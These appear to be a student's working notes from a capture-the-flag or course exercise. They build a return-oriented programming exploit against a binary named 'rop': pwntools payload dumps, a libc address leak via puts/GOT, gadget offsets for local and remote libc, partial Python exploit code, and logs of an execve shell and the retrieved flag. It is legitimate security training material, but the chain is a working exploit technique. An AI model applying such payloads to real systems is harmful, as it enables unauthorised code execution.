    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  a9 04 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  b3 06 40 00  00 00 00 00  30 10 60 00  00 00 00 00  │··@·│····│0·`·│····│
    00000040  c0 04 40 00  00 00 00 00  21 06 40 00  00 00 00 00  │··@·│····│!·@·│····│
    00000050  0a                                                  │·│
    00000051
[DEBUG] Received 0x3d bytes:
    00000000  50 70 e4 91  dd 7f 0a 43  61 6e 20 79  6f 75 20 70  │Pp··│···C│an y│ou p│
    00000010  6f 70 20 73  68 65 6c 6c  3f 20 49 20  74 6f 6f 6b  │op s│hell│? I │took│
    00000020  20 61 77 61  79 20 61 6c  6c 20 74 68  65 20 75 73  │ awa│y al│l th│e us│
    00000030  65 66 75 6c  20 74 6f 6f  6c 73 2e 2e  0a           │eful│ too│ls..│·│
    0000003d
/home/kali/.local/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] PpäÝ\x7f
[*] puts leak - 0xa7fdd91e47050
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_3.py:118: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
[DEBUG] Sent 0x51 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  a9 04 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  b3 06 40 00  00 00 00 00  30 10 60 00  00 00 00 00  │··@·│····│0·`·│····│
    00000040  c0 04 40 00  00 00 00 00  21 06 40 00  00 00 00 00  │··@·│····│!·@·│····│
    00000050  0a                                                  │·│
    00000051
[DEBUG] Received 0x3d bytes:
    00000000  50 70 e4 91  dd 7f 0a 43  61 6e 20 79  6f 75 20 70  │Pp··│···C│an y│ou p│
    00000010  6f 70 20 73  68 65 6c 6c  3f 20 49 20  74 6f 6f 6b  │op s│hell│? I │took│
    00000020  20 61 77 61  79 20 61 6c  6c 20 74 68  65 20 75 73  │ awa│y al│l th│e us│
    00000030  65 66 75 6c  20 74 6f 6f  6c 73 2e 2e  0a           │eful│ too│ls..│·│
    0000003d
[*] PpäÝ\x7f
[*] puts leak - 0xa7fdd91e47050
[DEBUG] Sent 0x51 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  a9 04 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  b3 06 40 00  00 00 00 00  30 10 60 00  00 00 00 00  │··@·│····│0·`·│····│
    00000040  c0 04 40 00  00 00 00 00  21 06 40 00  00 00 00 00  │··@·│····│!·@·│····│
    00000050  0a                                                  │·│
    00000051
[DEBUG] Received 0x3d bytes:
    00000000  50 70 e4 91  dd 7f 0a 43  61 6e 20 79  6f 75 20 70  │Pp··│···C│an y│ou p│
    00000010  6f 70 20 73  68 65 6c 6c  3f 20 49 20  74 6f 6f 6b  │op s│hell│? I │took│
    00000020  20 61 77 61  79 20 61 6c  6c 20 74 68  65 20 75 73  │ awa│y al│l th│e us│
    00000030  65 66 75 6c  20 74 6f 6f  6c 73 2e 2e  0a           │eful│ too│ls..│·│
    0000003d
[*] PpäÝ\x7f
[*] puts leak - 0xa7fdd91e47050
[*] Stopped process './rop' (pid 116179)
```
And this did also work remotely!

So NOW, we can calculate our offsets and stuff!

# Gadgets
```
  retAddr(main) --> 0x40062e    // Addr(A) --> pop rdi ; ret
		 rsp(A) --> 0x400708    // Addr('/bin/sh')
     retAddr(A) --> 0x400636    // Addr(B) --> pop rsi ; ret
		 rsp(B) --> 0x00
     retAddr(B) --> 0x40063e    // Addr(C) --> pop rdx ; ret
		 rsp(C) --> 0x00
     retAddr(C) --> 0x400646    // Addr(D) --> pop rax ; ret
		 rsp(D) --> 0x3b        // execve
     retAddr(D) --> 0x400625    // Addr(E) --> syscall
     retAddr(E) --> 0x4004a9    // Addr(F) --> ret
```
## Local LibC  `libc.so.6`
### `popRDI`
```
0x00000000004006b3 : pop rdi ; ret
```
### `popRSI`
This one is in the library:
```
0x0000000000029419 : pop rsi ; ret
```
This one is in the code but requires some junk data:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ ROPgadget --binary rop | grep -i "pop rsi"              
0x00000000004006b1 : pop rsi ; pop r15 ; ret
```
### `popRDX`
This one is in the library:
```
0x00000000000fd6bd : pop rdx ; ret
```
Is that the offset or the address? I'm thinking offset which would be nice
### `popRAX`
This one is in the library:
```
0x000000000003f587 : pop rax ; ret
```
### `syscall`
This one is in the library:
```
0x0000000000026468 : syscall
```
### `ret`
Back to one in the binary:
```
0x00000000004004a9 : ret
```

## Remote  `libc-2.31.so`
### `popRDI`
```
0x00000000004006b3 : pop rdi ; ret
```
### `popRSI`
This one is in the library:
```
0x000000000002601f : pop rsi ; ret
```
This one is in the code but requires some junk data:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ ROPgadget --binary rop | grep -i "pop rsi"              
0x00000000004006b1 : pop rsi ; pop r15 ; ret
```
### `popRDX`
This one is in the library:
```
0x0000000000119431 : pop rdx ; pop r12 ; ret
```
Needs junk data
### `popRAX`
This one is in the library:
```
0x0000000000036174 : pop rax ; ret
```
### `syscall`
This one is in the library:
```
0x000000000002284d : syscall
```
### `ret`
Back to one in the binary:
```
0x00000000004004a9 : ret
```

# Payloads:
## Local LibC  `libc.so.6`
```python

```


gots leak - 0x7fa6e4ce9050

libcBase - 0x7fa6e4cf1600



Real LibC base -
```
0x00007fa6e4c74000
```
I think?

so that would make the offset:
```
85B0
```


0x7f1162a51aa0


0x7f1162a5a050
0x7f11629e5000



IT's WORKING
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_3.py
[+] Starting local process './rop': pid 177572
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_3.py:260: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
b'\n'
/home/kali/.local/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] P>Î\x7f
[*] gots leak - 0x7f94ce3e9050
[*] libcBase - 0x7f94ce374000
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_3.py:282: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
[*] popRDX - 0x7f94ce4716bd
[*] popRAX - 0x7f94ce3b3587
[*] syscall - 0x7f94ce39a468
[*] Switching to interactive mode

$ whoami
kali
$ pwd
/home/kali/Desktop/6-Week/ROP-Pop-Pop
$  zsh: suspended (signal)  python3 RPP_Pwn_3.py    
```


For remote, must use other offsets
Gets == `0x00183970`
So I think the offset is `0x00083970`

Binsh is at:
```
0x002b45bd
```
so the offset is
```
0x001b45bd
```



Fuck this I win:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/ROP-Pop-Pop]
└─$ python3 RPP_Pwn_3.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1343: Done
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_3.py:307: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
b'\n'
/home/kali/.local/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] pÙ)5Ù\x7f
[*] gots leak - 0x7fd93529d970
[*] libcBase - 0x7fd93521a000
/home/kali/Desktop/6-Week/ROP-Pop-Pop/RPP_Pwn_3.py:329: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("tools..")
[*] popRDX - 0x7fd935333431
[*] popRAX - 0x7fd935250174
[*] syscall - 0x7fd93523c84d
[*] Switching to interactive mode

$ whoami
pwn
$ pwd
/home/pwn
$ ls
flag.txt
rop
$ cat flag.txt
flag{sodapop_shop}
[*] Got EOF while reading in interactive

```


```
└─$ python3 RPP_Pwn_3.py
[+] Starting local process '/bin/bash': pid 193237
[*] P°çáµ\x7f
[*] puts leak - 0xa7fb5e1e7b050
[*] Switching to interactive mode

Program received signal SIGSEGV, Segmentation fault.
0x00007ffc15109200 in ?? ()
gef➤  $ got

GOT protection: Partial RelRO | GOT functions: 5
[0x601018] puts@GLIBC_2.2.5  →  0x7fb5e1e7bb00
[0x601020] __libc_start_main@GLIBC_2.2.5  →  0x7fb5e1e2d700
[0x601028] __gmon_start__  →  0x4004e6
[0x601030] gets@GLIBC_2.2.5  →  0x7fb5e1e7b050
[0x601038] setvbuf@GLIBC_2.2.5  →  0x7fb5e1e7c2e0 
```

```python
def leakGets():
	binary = context.binary = ELF('./rop', checksec=False)
	
	# 0x00000000004006b3 : pop rdi ; ret
	popRDI = p64(0x004006b3)
	retGdgt = p64(0x004004a9)
	
	pltPuts = p64(binary.plt.puts)		# Address to call
	gotGets = p64(binary.got.gets)


	pld = cyclic(40)
	pld += retGdgt + popRDI + gotGets + pltPuts
	return pld

def leaky(p):
	p.recvuntil("tools..")
	p.sendline(leakGets())
	p.recvline()
	addr = p.recvline()
	log.info(addr)
	leak = u64(addr.ljust(8, b'\x00'))
	leak -= 0xa000000000000
	log.info("Gets leak - " + hex(leak))
```